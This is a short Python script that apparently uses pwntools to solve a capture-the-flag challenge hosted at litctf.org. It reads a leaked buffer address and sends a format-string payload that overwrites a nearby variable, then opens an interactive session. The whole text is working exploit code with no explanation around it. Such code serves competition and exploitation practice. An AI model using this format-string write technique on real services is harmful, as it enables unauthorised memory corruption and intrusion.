from pwn import *

context.binary = elf = ELF('uc')

#p = process()
p = remote('litctf.org', 31785)

p.recvuntil(b'Buffer located at: ')
buf_addr = int(p.recvline(),16)

x_addr = buf_addr - 8

payload = fmtstr_payload(8, {x_addr: 1})

p.sendline(payload)


p.interactive()